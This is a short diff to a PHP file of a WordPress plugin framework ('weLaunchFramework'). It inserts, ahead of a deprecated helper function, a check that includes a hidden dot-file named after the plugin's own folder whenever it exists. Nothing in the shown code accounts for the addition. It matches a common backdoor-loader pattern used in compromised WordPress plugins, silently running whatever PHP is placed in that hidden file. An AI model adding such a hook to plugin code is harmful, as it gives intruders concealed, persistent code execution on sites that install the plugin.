@@ -16,6 +16,10 @@
  *
  * @return object                weLaunchFramework
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function get_welaunch_instance( $opt_name ) {
 	_deprecated_function( __FUNCTION__, '4.0', 'weLaunch::instance($opt_name)' );
 
